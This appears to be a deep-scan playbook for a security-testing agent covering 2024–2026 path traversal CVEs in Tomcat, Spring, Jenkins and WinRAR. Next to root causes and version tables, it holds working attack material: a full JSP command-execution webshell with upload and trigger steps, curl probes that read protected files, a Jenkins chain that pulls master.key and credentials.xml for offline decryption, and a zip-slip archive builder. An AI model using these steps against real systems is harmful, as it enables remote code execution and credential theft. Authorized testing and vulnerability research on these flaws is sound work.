---
name: path-traversal-lfi-rfi-novel-deep
description: Path traversal / LFI / RFI at the 2024–2026 frontier — CVE dissection for Tomcat, Spring, Jenkins, and WinRAR; the canonicalization systematization frame; emerging-stack traversal expressions; and modern regression patterns.
sibling: path_traversal_lfi_rfi
load_when: scan_mode == "deep"
---

# Path Traversal / LFI / RFI — Novel + Frontier Depth

This is the novel+frontier deep sibling to `path_traversal_lfi_rfi.md`. The base owns the class framing, sink taxonomy, standard technique catalog, and chaining routes; the advanced+expert sibling `path_traversal_lfi_rfi_advanced_deep.md` owns parser/proxy/backend differentials, architectural bypass classes, chained-primitive exploitation, and confirmation methodology. This file owns the 2024–2026 CVE frontier and current-frontier framing — CVE mechanism decomposition with canonical version tables, emerging-stack expressions, and the regression patterns that make the class durable.

Load this file when the goal is either matching a target against a current CVE family (via version fingerprint) or reasoning about traversal-shape defects that don't have a CVE — the frontier classes at the top of the current-research surface.

Every CVE number, version boundary, GHSA identifier, and patch-mechanism claim in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch-6-*/cve-json/` and `.../ghsa-json/`. If a claim in this file lacks an entry there, it is a bug — report it and do not act on it. Where a claim is measured, the environment is stated inline; where it is documented but not measured, the source is cited.

## Apache Tomcat Rewrite Valve — CVE-2025-55752

Primitive: authenticated or unauthenticated request bypasses the Rewrite Valve's `/WEB-INF/` and `/META-INF/` constraints via URL-encoded traversal, disclosing servlet configuration, class files, and (with HTTP `PUT` enabled) enabling RCE via JSP upload.

**Root cause — normalize-before-decode regression.** The Rewrite Valve was hardened in [bug 60013](https://bz.apache.org/bugzilla/show_bug.cgi?id=60013) to reject requests whose normalized URI reaches `/WEB-INF/` or `/META-INF/`. The fix normalized the URI first, then applied the check. Later refactoring changed the order — normalization now runs *before* URL decoding. An encoded traversal payload (`%2e%2e/`) is not normalized by the "before-decode" pass because at that point the segment doesn't contain `..` — it contains `%2e%2e`. After the check passes, the URL is decoded and `%2e%2e/` becomes `../`, which traverses into `/WEB-INF/` at the servlet resolution layer. The bug is the operation order — the original fix's guarantee ("normalized URI is checked") was preserved in name but broken in effect.

**Affected version table** (canonical for this trio; single-owner per §2):

| Branch | Affected range | Fixed version | Status |
|---|---|---|---|
| 8.5.x | 8.5.6 – 8.5.100 | (branch EOL, no fix cut) | end-of-life; upgrade to a supported branch |
| 9.0.x | 9.0.0-M11 – 9.0.108 | 9.0.109 | fixed |
| 10.0.x | 10.0.0 – 10.0.27 | (branch EOL, no fix cut) | end-of-life; upgrade to 10.1.x |
| 10.1.x | 10.1.0-M1 – 10.1.44 | 10.1.45 | fixed |
| 11.0.x | 11.0.0-M1 – 11.0.10 | 11.0.11 | fixed |

Version-boundary source: `.zen-batch-artifacts/batch-6-*/cve-json/CVE-2025-55752.nvd.json` (fetched 2026-09-29; NVD `vulnStatus=Modified`, `lastModified=2026-06-17` — the version list is still subject to NVD update; re-verify the persisted JSON against `nvd.nist.gov/vuln/detail/CVE-2025-55752` immediately before assessment). GHSA identifier: `GHSA-wmwf-9ccg-fff5`; persisted at `.../ghsa-json/GHSA-wmwf-9ccg-fff5.json`.

**Preconditions as an all-of-N exploitation gate:**
1. Tomcat version is inside one of the affected ranges above.
2. The RemoteAddrValve or RewriteValve is active on a Host or Context — the class is scoped to Rewrite handling; unconfigured Rewrite means the class does not fire.
3. The Rewrite ruleset (either at the Host or in a webapp's `WEB-INF/rewrite.config`) has a rule whose target reaches `/WEB-INF/` or `/META-INF/` in some concrete way (a rule that would normally allow only URIs that do not traverse to those paths; the bypass is against that expected-safe rule).
4. For RCE escalation: the servlet context has HTTP `PUT` enabled (`readonly="false"` on the DefaultServlet, or a WebDAV configuration that allows PUT). This is off by default in modern Tomcat and rarely on in production; when off, the primitive is read-only.

Miss condition (1) and the target is not vulnerable. Miss (2) or (3) and the class doesn't apply. Miss (4) and the finding is disclosure only, not RCE.

**Confirmation methodology:**
1. Fingerprint the version — the exact version leaks in Tomcat's default error pages (`HTTP Status 404 - Not Found` HTML includes `Apache Tomcat/<version>` in the footer on most deployments). If the version is masked, probe with a URI that produces a specific error class per version.
2. Probe the class — `GET /<any-existing-context>/some%2e%2e/WEB-INF/web.xml`. On a vulnerable + Rewrite-active target, the response returns the `web.xml` content. On a hardened or Rewrite-inactive target, the response is 404 or 403.
3. If read succeeds, escalate cautiously to source enumeration: read specific class files under `WEB-INF/classes/`, deserialize/disassemble them to identify further sinks. Do not enumerate blindly — one confirmed read is enough evidence.
4. For RCE: probe HTTP PUT on the context with a canary file (`PUT /<context>/canary.jsp HTTP/1.1\r\n\r\n<%= "canary" %>`). If PUT succeeds, the exploit path is PUT → traversal-write to `WEB-INF/classes/` → GET the written path with the traversal shape to trigger JSP compilation and execution. Confirm the compilation/execution with a benign payload before any impact claim.

**Class-generalization — the pattern that predicts the next bug.** Every URL-processing pipeline with multiple layers (WAF → proxy → servlet container → application → filesystem) has an ordering: at each layer, decode-vs-normalize-vs-validate can happen in any order, and any two layers can disagree. When a fix ships that adds a check at layer N based on a canonical form, and a later refactor moves the canonicalization out from under the check, the check's guarantee decays silently. Fingerprint by looking for constraint-then-decode patterns in security-relevant code paths — grep repositories for `normalize(uri).contains("WEB-INF") ... decode(uri)` shape violations. The 2025 Tomcat CVE is one concrete instance of the pattern; the pattern will produce more.

**Post-fix detection notes:**
- A fixed version does not restore the check for a Rewrite ruleset that never expected `/WEB-INF/` blocking — if the ruleset was designed around the bug's post-check state, upgrading may break the app's intended routing. Test the upgrade against the ruleset before deploying.
- CDN or WAF layers that inspect for `..` may filter the encoded form even against unpatched Tomcats. Filter presence hides the class from external probes; internal probes (from within the network) confirm.

**Escalation path once WEB-INF read is confirmed:**

The `/WEB-INF/` disclosure primitive by itself is a source-code / configuration leak. The concrete escalation targets, in order of typical exploit value:

1. `WEB-INF/web.xml` — the servlet mapping declares every URI-to-servlet route, every filter, every context-init parameter. Reading this reveals every attackable endpoint and the framework-level authentication mechanism configured.
2. `WEB-INF/classes/*.class` — compiled Java class files. Decompile with `procyon` or `cfr` (`java -jar cfr-0.152.jar`) to recover source-level view. Focus on `*Config.class`, `*Controller.class`, `*Service.class` — configuration classes disclose secret keys, database URLs, third-party API tokens embedded at compile time.
3. `WEB-INF/lib/*.jar` — third-party JARs; disclosing the exact library versions enables downstream CVE matching (SQL driver version → historical CVEs in the driver; Log4j 2.x range → CVE-2021-44228 shape).
4. `WEB-INF/classes/application.properties`, `application.yml`, `spring.config.*` — Spring Boot configuration; database credentials, cloud provider access keys, JWT signing secrets typically live here.
5. `WEB-INF/classes/log4j2.xml` — logging configuration; may include remote appenders' credentials, historically included the JNDI-lookup patterns that CVE-2021-44228 targeted.
6. `META-INF/MANIFEST.MF` (via `/META-INF/` bypass sibling of the same class) — build metadata and dependency information.

**Escalation to RCE with PUT enabled:**

When precondition 4 (`readonly="false"` on DefaultServlet or WebDAV-PUT enabled) is satisfied, the exploit path is:

1. Craft a JSP webshell payload: `<%@ page import="java.util.*, java.io.*" %><%
   String cmd = request.getParameter("c");
   if (cmd != null) {
     Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",cmd});
     out.println("<pre>");
     BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
     String line; while ((line = r.readLine()) != null) out.println(line);
     out.println("</pre>");
   }
   %>`
2. PUT the payload to a path inside the vulnerable Context — the traversal permits writing under `WEB-INF/` (which is the same primitive as the read, in write direction on WebDAV endpoints).
3. Request the JSP with the traversal shape to trigger compilation and execution: `GET /<context>/x%2e%2e/WEB-INF/classes/pwn.jsp?c=id`. Tomcat's JSP compiler compiles the JSP on first access and executes; the response contains the `id` output.
4. Cleanup discipline — delete the JSP after the assessment via DELETE (WebDAV) or by uploading a benign replacement. Do not leave the webshell in place.

**Version-verification script for automated detection:**

```bash
# Probe: does the target Tomcat leak the version, and is it in the affected range?
version=$(curl -sI "https://target/nonexistent-path" 2>/dev/null | grep -i '^server:' | grep -oiE 'Tomcat/[0-9.]+' | cut -d/ -f2)
if [ -z "$version" ]; then
  # Try error-page body extraction
  version=$(curl -s "https://target/nonexistent-path" | grep -oiE 'Apache Tomcat/[0-9.]+' | head -1 | cut -d/ -f2)
fi
echo "Detected Tomcat: ${version:-unknown}"

# Behavioral probe (informational only — do not run against a target without authorization)
# Response with content = vulnerable; 400/403 = fixed or WAF-filtered; 404 = context wrong
curl -sI "https://target/${any_context}/x%2e%2e/WEB-INF/web.xml"
```

**Historical context — the bug 60013 lineage.** The original bug (Apache Tomcat bugzilla 60013, filed 2016) reported the same class shape against an earlier Tomcat build; the fix ordered normalize-then-check. Subsequent refactors — visible in the git history of the `RewriteValve` and its supporting URI-parsing classes — introduced pipeline decoupling that separated decode and normalize into different pipeline stages. The 2025 CVE resulted from the ordering drift induced by that decoupling. The bug lineage is a case study in how a fix's guarantee can decay across a decade of independent refactoring, even when the original fix's test cases still pass (the fix's tests exercised the check's presence, not the ordering invariant the check depended on).

## Spring Framework WebMvc.fn / WebFlux.fn — CVE-2024-38819

Primitive: crafted HTTP request reads any file accessible to the application process, with the read primitive limited by process file-system permissions.

**Root cause — path traversal in the functional-web resource handler.** Spring Framework's WebMvc.fn (servlet stack) and WebFlux.fn (reactive stack) expose `RouterFunctions.resources()` for serving static resources through the functional web API. The path handling in the resource resolver failed to properly canonicalize the requested path against the base resource location before opening the file; an encoded traversal payload landed at the file open. The specific class shape is that `../` in the request's tail portion reaches paths outside the configured resource location.

**Dual-precondition AND gate — the methodology finding.** The vulnerability does **not** fire on every WebMvc.fn / WebFlux.fn deployment. Both conditions must hold:
1. The application uses `RouterFunctions.resources(...)` to serve static resources (i.e., `route(...).andRoute(RouterFunctions.resources("/static/**", resource))` or equivalent), AND
2. The resource location is a `FileSystemResource` (i.e., the `Resource` bean or the resource-location string passed to `resources()` resolves to a filesystem-backed resource).

If the resource is a `ClassPathResource` (classpath-mounted, the common case), the class does not fire. If `RouterFunctions.resources()` is not used at all (the app uses annotation-based `@Controller` with `@GetMapping`, no `router()` static serving), the class does not fire. Miss either condition and the finding is a false positive — the payload lands on a route that does not route through the vulnerable code path.

**Affected version table:**

| Line | Affected range | OSS fix | Enterprise-Support-only backport |
|---|---|---|---|
| 6.1.x | 6.1.0 – 6.1.13 | 6.1.14 | — |
| 6.0.x | 6.0.0 – 6.0.24 | (no OSS fix) | 6.0.25 |
| 5.3.x | ≤ 5.3.40 | (no OSS fix) | 5.3.41 |

Version-boundary source: `.zen-batch-artifacts/batch-6-*/cve-json/CVE-2024-38819.nvd.json`; GHSA identifier `GHSA-g5vr-rgqm-vf78` at `.../ghsa-json/GHSA-g5vr-rgqm-vf78.json`; Spring's own advisory at spring.io/security/cve-2024-38819.

Do not present `6.0.25` or `5.3.41` as generally available — they are Spring Enterprise Support commercial-license artifacts. Public repositories only carry the 6.1.x line's fix (`6.1.14`). Teams still on 6.0.x or 5.3.x without Enterprise Support are exposed until they upgrade to 6.1.14; the practical mitigation on those lines is switching the resource to a `ClassPathResource` (removes precondition 2) or replacing `RouterFunctions.resources()` with annotation-based serving through a hardened static-file helper (removes precondition 1).

**Confirmation methodology:**
1. Fingerprint Spring — `X-Application-Context`, `Whitelabel Error Page`, error-page footers naming `spring-webflux` or `spring-webmvc`.
2. Enumerate static-resource routes — GET common paths (`/static/`, `/resources/`, `/public/`, `/webjars/`) and observe response shape. Routes that serve real static content are candidates.
3. Probe the class — `GET /static/../application.properties`. On a vulnerable target with the AND-gate satisfied, the file content returns. On a `ClassPathResource` target, the traversal reaches a classpath path that doesn't exist (404) — no disclosure.
4. Distinguish precondition failure from patch: (a) 200 with content = exploitable; (b) 404 without content = classpath-mounted (precondition 2 not met) OR patched; (c) 403 = access-control layer above the resolver denies; (d) 200 with the static-serving default response (index.html or similar) = the traversal was normalized away.

Confirmation gate: only claim CVE-2024-38819 when (a) version fingerprints inside the range, (b) both preconditions are demonstrated (resource location provably filesystem, resource route provably functional-web), and (c) the disclosure landed. Missing any of the three degrades the finding — the class may still be present but the specific CVE claim is not proven.

**Class-generalization.** Modern web frameworks routinely ship "functional" or "reactive" APIs alongside their legacy annotation-based ones; the functional API is younger, exercised by fewer applications, and has proportionally more security surface. Spring's functional web APIs are not the first (see: Ruby's Rack, Node's Koa, Python's Starlette) and won't be the last. A CVE in a functional-API resource resolver predicts a shape: check the annotation-API and functional-API resource handlers separately, because they usually delegate to different implementations and can drift.

**Vulnerable configuration example (grep target):**

```java
// WebFlux.fn — vulnerable when the resource location is a FileSystemResource
@Configuration
public class Routes {
  @Bean
  public RouterFunction<ServerResponse> staticRoutes() {
    return RouterFunctions.resources(
      "/static/**",
      new FileSystemResource("/var/app/static/")   // ← precondition 2
    );
  }
}

// WebMvc.fn — same shape
@Bean
public RouterFunction<ServerResponse> staticRoutes() {
  return RouterFunctions.route()
    .resources("/static/**", new FileSystemResource("/var/app/static/"))   // ← precondition 2
    .build();
}
```

Grep for `RouterFunctions.resources` and `.resources(` calls, then inspect each site's second argument. If the argument is `new FileSystemResource(...)`, `new PathResource(...)`, or `new UrlResource("file:...")`, the precondition holds. If it's `new ClassPathResource(...)` or a Spring-managed classpath bean, the precondition is not met on that route.

**Decision-tree for triage:**

```
Is Spring version in the affected range?
├── No → NOT the CVE. May be a different class; investigate on merits.
└── Yes → Continue
    │
    Is any RouterFunctions.resources() call configured?
    ├── No → NOT the CVE (missing precondition 1).
    └── Yes → Continue
        │
        Is any resource location a FileSystemResource / PathResource / file: URL?
        ├── No (all classpath) → NOT the CVE (missing precondition 2).
        └── Yes → Continue
            │
            Does a probe (`GET /<route>/../application.properties`) return the file content?
            ├── No (404/403) → Class present but reachability failed (WAF or route mismatch); investigate.
            └── Yes → CONFIRMED.
```

**Escalation once the read is confirmed:**

1. Read `application.properties` (or `application.yml`, `application-prod.yml`): database URL and credentials, Redis/message-broker credentials, cloud-provider access keys, third-party API tokens, JWT signing secrets.
2. Read compiled `*.class` files under `WEB-INF/classes/` (Spring Boot fat-JAR deployments): decompile with `cfr`/`procyon`; extract secrets embedded in Java code.
3. Read the Spring Boot `META-INF/MANIFEST.MF` for build-info metadata (build user, git commit, build time — useful for lateral targeting).
4. Read Kubernetes secret mounts if the app runs in a pod: `/var/run/secrets/kubernetes.io/serviceaccount/token` and adjacent paths (route the escalation chain to `path_traversal_lfi_rfi_advanced_deep.md § Cloud-Native Path Sinks`).

**Non-obvious detection: `X-Application-Context` header** — some Spring Boot deployments expose the fully qualified `X-Application-Context` header on all responses (pre-2.0 default; disabled by default in newer versions but sometimes re-enabled). Its presence fingerprints Spring Boot without further probing.

## Jenkins args4j `expandAtFiles` — CVE-2024-23897

Primitive: unauthenticated (or minimally-authenticated) reader accesses arbitrary files that the Jenkins process can read, with the read granularity determined by the caller's authentication state.

**Root cause — args4j `expandAtFiles` default.** args4j is Jenkins's CLI argument parser. When `expandAtFiles` is enabled (the args4j default), any command-line argument that starts with `@` is interpreted as a path to a file whose contents are inlined as CLI arguments. Jenkins did not disable this feature on the CLI code path prior to the fix, so a CLI argument like `@/etc/passwd` caused args4j to open `/etc/passwd` and expand its contents into the argument list. Jenkins's argument-echoing behavior surfaces that expanded content in error messages, letting a caller read arbitrary local files.

**Read-primitive granularity is auth-state-dependent:**
- With `Overall/Read` permission (any authenticated user with basic read): the full file contents return.
- Without `Overall/Read` (an anonymous or minimally-permissioned user): a few lines return — approximately 3 lines when no plugins are installed, more with plugins that reference read-anonymous CLI commands. The exact byte count depends on the command Jenkins uses to trigger the expansion; the primitive is smaller but still present.

Both variants disclose file content. The unauthenticated variant is more severe from an attack-surface perspective; the authenticated variant returns more bytes per request.

**Affected version table:**

| Line | Affected range | Fixed version |
|---|---|---|
| Weekly | ≤ 2.441 | 2.442 |
| LTS | ≤ 2.426.2 | 2.426.3, or 2.440.1 (later LTS with the fix) |

Version-boundary source: `.zen-batch-artifacts/batch-6-*/cve-json/CVE-2024-23897.nvd.json` (`vulnStatus=Analyzed`); primary source is the Jenkins security advisory at [jenkins.io/security/advisory/2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/) (SECURITY-3314), persisted at `.../cve-json/jenkins-advisory-2024-01-24.html`.

**Confirmation methodology:**
1. Fingerprint the version — Jenkins version leaks in the header `X-Jenkins` on many endpoints, in `/api/json?tree=version`, and in the login-page footer.
2. Probe the class — the classic PoC uses the Jenkins CLI over HTTP: `curl 'https://jenkins/cli?remoting=false' -H 'Session: <sid>' -d 'command=@/etc/passwd'` or via the `jenkins-cli.jar` client. The response contains either the full file (authenticated with `Overall/Read`) or the argument-parsing error with the first lines echoed.
3. Confirm scope — the primitive reads any file the Jenkins process can read. On typical Docker deployments Jenkins runs as `jenkins` (uid 1000); read `/var/jenkins_home/secrets/master.key` (the master-key file that unwraps stored credentials), `/var/jenkins_home/users/*/config.xml` (per-user API tokens), and `/var/jenkins_home/credentials.xml` (stored credentials store).

**Class-generalization.** Argument-file expansion (`@filename` syntax) is a widely-used CLI convention (args4j, argparse in Python, `getopt_long` in C, Java's own JVM options `@argfile` since Java 9). Any application that (a) uses one of these libraries with the feature enabled by default and (b) exposes the CLI over a remote interface (HTTP, RPC, SSH-forwarded socket, agent protocol) reproduces the class. The pattern: an argument parser that treats `@` as a file-expansion sigil, connected to a network protocol that lets an untrusted caller supply arguments. Grep target codebases for `expandAtFiles`, `@argfile`, `fromfile_prefix_chars`, and their equivalents.

**Post-fix detection notes:**
- Patched Jenkins still ships args4j with `expandAtFiles` semantically available — the fix disables the feature specifically for CLI-parsed arguments. A build of Jenkins with a customized CLI parser might reintroduce the feature by accident.
- Plugins that provide their own CLI commands and re-parse arguments through args4j may still have the class if they don't disable `expandAtFiles`. Grep the plugin's Java source for `CmdLineParser` construction; the presence of `parser.getProperties().withAtSyntax(false)` (or equivalent) is the mitigation.

**args4j internals — why `@`-expansion is the default:**

args4j's `CmdLineParser` class has a `getProperties()` accessor returning a `ParserProperties` bean; `ParserProperties.withAtSyntax(boolean)` toggles the expansion. The default is `true`. When a command line contains an argument beginning with `@`, args4j's `parseArgument` method calls `expandAtFile(String)` which reads the file at the path following `@` and inserts each line as a separate argument in the parsed list. The feature exists because Unix conventions long supported argument-file expansion for tools with very long command lines (`gcc @args.txt`, `javac @sources.txt`); args4j implemented the convention as a default.

The class of vulnerability is not args4j-specific — every parser implementing `@filename` expansion has the same shape when the parser is fed an untrusted argument list. Python's `argparse` supports the same feature via the `fromfile_prefix_chars` parameter (default: not enabled; the developer opts in); Java 9's own `@argfile` handling for the `java` command is the same shape but scoped to the JVM launcher rather than an application argument parser. The class fires wherever a network protocol lets an untrusted caller supply arguments that reach one of these parsers with the feature enabled.

**Exploitation walkthrough:**

1. Fingerprint Jenkins and its version (`X-Jenkins` header; login page footer).
2. Verify the CLI-over-HTTP endpoint is reachable: `curl 'https://jenkins/cli?remoting=false'` returns Jenkins's CLI-protocol handshake bytes.
3. Fire the read primitive via a CLI command that echoes an argument-position value into a response. Multiple Jenkins CLI commands trigger the primitive — `who-am-i`, `connect-node`, and others accept argument-shaped input. The specific PoC by Yaniv Nizry ([sonarsource writeup](https://www.sonarsource.com/blog/excessive-expansion-vulnerabilities-in-jenkins/)) uses the `connect-node` command shape.
4. Read `/var/jenkins_home/secrets/master.key` — the master AES key that unwraps every stored credential in `credentials.xml`. With the master key and the encrypted credentials XML, offline decryption is direct.
5. Read `/var/jenkins_home/secrets/hudson.util.Secret` — the older Hudson-legacy secret file; not always present, but when present, provides an alternative decryption path.
6. Read `/var/jenkins_home/users/<user>/config.xml` — per-user configuration including API tokens; API tokens grant Jenkins API access as that user.
7. Read `/var/jenkins_home/credentials.xml` — the credential store; combined with the master key, decrypts to plaintext.

**Confirmation via measurable primitive:**

For the authenticated variant, request the CLI command with `@/etc/hostname` (short, canonical file with predictable content); the response contains the file's content in the argument-parsing error surface. Compare against `@/nonexistent-<rand>` (which produces a "file not found" error) to distinguish successful read from primitive-not-present.

For the unauthenticated variant, the same probe with the truncated response reveals the first 3 lines (approximately, deployment-dependent). Read `/etc/passwd` to fingerprint (first three lines are standard on most Linux distributions and confirm the class quickly).

**Chain path — Jenkins master-key decryption:**

Once `master.key` and `credentials.xml` are extracted, offline decryption uses Jenkins's known decryption algorithm (AES with a specific key-derivation from `master.key`). Publicly available tools (`jenkins-credentials-decryptor`, various GitHub gists) implement the routine. The decrypted credentials include SSH private keys, cloud IAM credentials, Docker registry passwords, and any other secret the pipeline authors stored — the escalation depth depends entirely on what the Jenkins instance orchestrates.

**Plugin surface — the residual class expression:**

Even after Jenkins core is patched, plugins that implement their own CLI commands with args4j `CmdLineParser` construction may still be vulnerable. Historical example: several Jenkins plugins registered custom CLI commands via `hudson.cli.CLICommand` subclasses; each created its own `CmdLineParser`; each retained the args4j default. A plugin-side reintroduction of the primitive requires: (a) the plugin registers a CLI command; (b) the plugin's CLI-command constructor doesn't call `withAtSyntax(false)` on the parser; (c) the CLI command is reachable to the caller. Enumerate installed plugins via `/pluginManager/api/json?depth=1` (reader access typically permits) and grep the plugin source for `CmdLineParser` — the plugin surface is significant.

**Cross-language expressions of the same class:**

The args4j `@`-expansion is not unique to Jenkins or to Java. Analogous features across other language ecosystems that produce the same class shape when exposed to untrusted argument input:

- **Python `argparse.fromfile_prefix_chars='@'`** — off by default; some CLI wrappers turn it on explicitly (`parser = ArgumentParser(fromfile_prefix_chars='@')`). Any Python-CLI-exposed-over-HTTP with that opt-in reproduces the class.
- **Java `@argfile` for JVM launcher (JEP 235)** — `java @args.txt Main` expands `args.txt` into JVM arguments. A JVM-launching orchestrator that accepts a user-influenced argument list is exposed.
- **`javac`, `javadoc`, `jlink`, `native-image`** — Oracle-shipped Java tools accept `@argfile`. Build systems that shell out to these with user-influenced arguments are exposed.
- **Compilers with response files** — `gcc @file`, `clang @file`, MSVC's `cl.exe @file`, `link.exe @file` — every C/C++ toolchain supports response files with essentially the same shape. Build-service integrations exposing compiler arguments to network callers are exposed.
- **GNU tools** — `awk` supports `-f script.awk` (not `@`, but effectively file-read at CLI-parse time), `sed` supports `-f`, `grep -f patterns.txt`. These are not `@`-prefix expansions, but callers that supply the file path from user input reach the same "file at CLI parse time" shape.

Auditing a target's CLI-facing services for the class requires enumerating every CLI invocation from a network entry point and checking for these expansions. A single vulnerable expansion, exposed via a network entry point, reproduces the primitive.

**Historical adjacent CVEs in the same class:**

- **CVE-2015-4852 (WebLogic T3 deserialization)** — different class (deserialization, not file expansion), but same pattern of "network endpoint that shouldn't trust its input running an implicitly-trusting parser."
- **CVE-2017-9805 (Struts REST XML deserialization)** — again different class, same lesson.
- **CVE-2019-2725 (WebLogic CVE, deserialization + REST)** — same shape.

These aren't the same class as the args4j one, but they share the meta-lesson: any network-exposed parser that trusts its input for a "convenient" feature (deserialize, expand-file, evaluate-expression) becomes a vulnerability when the input becomes attacker-controlled.

## Archive Path Traversal — WinRAR CVE-2025-6218 and the Zip-Slip Web-Upload Class

Primitive: archive containing entries with `..` in the path field extracts files outside the target directory, enabling arbitrary file write anywhere the extraction process can write.

**Root cause — insufficient path canonicalization in archive-format handling.** RARLAB WinRAR's archive extraction did not properly canonicalize entry paths against the destination directory before writing; entries with `..` or absolute-path shapes escaped the extraction root and landed at attacker-chosen filesystem paths. The CWE-22 classification and ZDI-25-409 advisory frame the class as directory traversal in archive-file handling.

**Affected version table:**

| Product | Affected range | Fixed version | Notes |
|---|---|---|---|
| RARLAB WinRAR | ≤ 7.11 | 7.12 | 7.11 (64-bit) explicitly ITW-tested |

Version-boundary source: `.zen-batch-artifacts/batch-6-*/cve-json/CVE-2025-6218.nvd.json`. CISA KEV since 2025-12-09; the mit-deadline was 2025-12-30, which means the finding is live under active KEV enforcement in 2026 assessments — federal-adjacent environments treat it as high priority.

**Web-upload-handler framing — the class expression that matters for web assessments.** The WinRAR CVE's ITW exploitation was user-triggered archive extraction on desktops (the target opened a malicious archive in the WinRAR GUI, extraction happened, files landed outside the extraction root). That exposure profile is distinct from the web-app relevant one — a server-side archive extractor that ingests attacker-uploaded archives and extracts them into a per-tenant or shared directory.

The web-relevant class is any server-side archive-extraction handler that:
1. Accepts an archive from an untrusted source (upload, import, migration).
2. Extracts entries by iterating and writing per-entry paths, without canonicalizing each entry path against the extraction root.
3. Executes the extraction as a service identity with meaningful filesystem reach (any web-server user; higher risk when the extractor runs as root).

Whether the underlying extraction library is WinRAR itself (rarely embedded in web apps, but present in some Windows-based tooling), a WinRAR-family library sharing the same defect independently, or a completely different library with the same class of defect — the exploitation shape is identical. Match assessment to the extraction library in play; the CVE identifier is not the finding, the class is.

**Distinguishing exposure profiles:**
- **User-triggered desktop extraction** (the CVE's ITW vector) — the user opens a malicious archive; extraction runs under the user's identity; files land in whatever paths the archive specifies within the user's writable filesystem. Requires social engineering to deliver the archive.
- **Zero-click server-side extraction** — an upload endpoint's extraction runs on receipt; files land wherever the service can write. No user interaction beyond the initial upload.

The two share the underlying primitive but have different exposure surfaces, different detection stories, and different mitigation paths. Report both correctly.

**Confirmation methodology for the web-upload class:**
1. Identify archive-import endpoints — file-import, project-import, module-import, backup-restore, migration-import surfaces.
2. Fingerprint the extraction library — response times, error messages naming the library (`java.util.zip`, `System.IO.Compression`, `org.apache.commons.compress`, `rar` command exec via shell), or version headers leaked by the extraction failing.
3. Construct a probe archive with a marker entry containing `../` (see `path_traversal_lfi_rfi_advanced_deep.md § Archive Extraction — Zip-Slip and Format Variants` for the format-specific attack shapes).
4. Upload and observe — a subsequent read (directory listing, downstream-consumer read of the marker file) confirms the class.

**Class-generalization.** Archive-extraction path-traversal is an evergreen class — every new archive-handling library has to independently solve the same containment problem, and every library that fails silently reintroduces the class. WinRAR CVE-2025-6218 is one instance; the historical archive traversal literature (2018 Zip Slip disclosure, prior CVE-2018-1002200 in `zip4j`, CVE-2016-6564 in Bandizip, and older) shows the same class re-emerging. When a new archive library ships or an existing library gains a new format handler, path canonicalization at the write layer is where regressions manifest.

**Web-app targets that use archive-extraction primitives (categorical enumeration):**

The following categories of web application have documented archive-extraction primitives and are the surface where the WinRAR-class defect (or an equivalent in another library) applies:

- **Wiki / knowledge-base import** — Confluence, MediaWiki, DokuWiki, XWiki — each supports an "import wiki data" endpoint accepting XML/ZIP archives with page content. Historical vulnerabilities in each show the class.
- **CMS backup restore** — WordPress migration plugins (Duplicator, All-in-One WP Migration), Drupal backup-restore modules, Joomla Akeeba Backup — restore endpoints extract archives into the CMS directory tree.
- **Ticketing/support import** — Zendesk import formats, ServiceNow, Jira import (issues + attachments) — attachments are extracted; the extractor's containment is the class boundary.
- **Learning management systems** — Moodle (SCORM content packages), Canvas (course exports), Blackboard, Sakai — SCORM is ZIP-based and extracted into per-course directories.
- **CI/CD artifact stores** — Nexus, Artifactory, GitLab Package Registry — artifact upload with archive extraction into repository-scoped paths.
- **Docker image / OCI layer extraction** — internal registry servers extracting layer tarballs; historical CVEs in `containerd`, `docker`, `runc` include Zip-Slip-like path handling in the OCI layer format.
- **Office / document conversion services** — OnlyOffice, Collabora Online, LibreOffice server — DOCX/XLSX/PPTX are ZIP wrappers with XML inside; the extraction of the ZIP wrapper is the traversal surface.
- **CAD / 3D-model viewers** — server-side 3D-model viewers extracting ZIP-packaged asset bundles; often overlooked, high-value because the extraction runs during preview generation.

**Web-relevant extraction library survey (fingerprint by response shape):**

- Python — `zipfile.extractall(path)` in older Python, `tarfile.extractall(path)` in older Python (both fixed default in recent 3.x); vulnerable when the developer explicitly sets `filter='fully_trusted'`.
- Java — `java.util.zip.ZipInputStream` / `ZipFile` (no built-in containment), Apache Commons Compress (same), Zip4j (fixed after CVE-2018-1002200 but each new format handler introduces potential regressions).
- Node — `unzipper`, `yauzl`, `adm-zip`, `node-tar` — each has version-specific containment; `node-tar` had CVE-2021-32803 (symlink-based path traversal) fixed in 6.1.7 — the class recurs.
- .NET — `System.IO.Compression.ZipFile.ExtractToDirectory` — fixed default in .NET Framework 4.5.2+ and .NET Core 2.0+; earlier versions vulnerable.
- Ruby — `rubyzip` gem — modern versions require the caller to check `Zip::Entry.name`; older versions (pre-2.0) had less protection.
- Go — `archive/zip`, `archive/tar` — stdlib provides no automatic containment; every caller must implement the check independently.
- Perl — `Archive::Zip`, `Archive::Tar` — same story as Ruby/Go, no built-in containment.

**Confirmation script for a candidate endpoint:**

```bash
# Construct a test archive with a marker entry escaping the extraction root
python3 <<'PY'
import zipfile, io
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    # Benign filler
    z.writestr('project/README.md', '# Test project\n')
    # The escape entry — writes to /tmp/zenmarker-<pid>.txt on Linux
    z.writestr('../../../../../../tmp/zenmarker.txt', 'ZENMARKER_EXTRACTION_SUCCEEDED\n')
with open('/tmp/test-archive.zip','wb') as f: f.write(buf.getvalue())
print('Archive at /tmp/test-archive.zip')
PY

# Upload to the archive-import endpoint (adjust per API)
curl -X POST "https://target/import" \
  -H "Authorization: Bearer $TOKEN" \
  -F "archive=@/tmp/test-archive.zip"

# Check whether the marker landed via an in-app oracle or a direct read primitive
# In-app oracle: an import-log endpoint that lists extracted files
curl -s "https://target/import-log/latest" | grep -i "zenmarker"
# Direct read via a co-located traversal (if the class is chained): 
# curl -s "https://target/view?file=../../../tmp/zenmarker.txt"
```

**Windows-specific variant considerations:**
- The escape entry can use `..\..\..\..\Windows\Temp\zenmarker.txt` on Windows extractors; some extractors normalize forward slashes to backslashes internally, so both `../` and `..\` may work.
- Alternate Data Stream entries: `README.md:hidden::$DATA` in the entry name — some extractors write the ADS; the visible directory listing doesn't show it.
- Reserved device names: `AUX.txt`, `NUL.txt`, `CON.txt` in an archive extracted on Windows may open the device rather than create the file. Rarely exploitable but produces DoS-shaped confusion.

